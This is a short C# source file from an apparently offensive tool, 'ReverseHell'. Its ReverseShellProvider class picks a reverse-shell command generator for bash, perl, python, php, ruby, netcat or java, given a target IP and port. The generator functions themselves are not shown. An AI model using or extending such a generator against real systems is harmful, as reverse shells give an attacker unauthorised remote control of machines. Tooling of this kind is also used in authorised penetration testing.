using System;
using System.Net;

namespace ReverseHell{
    class ReverseShellProvider{

        public static string GetReverseShell(string language, IPAddress address, string port){
            string terminalCommand = string.Empty;
             switch (language)
            {
                case "bash":
                    terminalCommand = ReverseShells.GetBashShell(Convert.ToString(address), port);
                    break;
                case "perl":
                    terminalCommand = ReverseShells.GetPerlShell(Convert.ToString(address), port);
                    break;
                case "python":
                    terminalCommand = ReverseShells.GetPythonShell(Convert.ToString(address), port);
                    break;
                case "php":
                    terminalCommand = ReverseShells.GetPHPShell(Convert.ToString(address), port);
                    break;
                case "ruby":
                    terminalCommand = ReverseShells.GetRubyShell(Convert.ToString(address), port);
                    break;
                case "nc":
                    terminalCommand = ReverseShells.GetNetcatShell(Convert.ToString(address), port);
                    break;
                case "java":
                    terminalCommand = ReverseShells.GetJavaShell(Convert.ToString(address), port);
                    break;
                default:
                    throw new ArgumentException("Unsupported or Unrecognised language.");
            }
            return terminalCommand;
        }
    }
}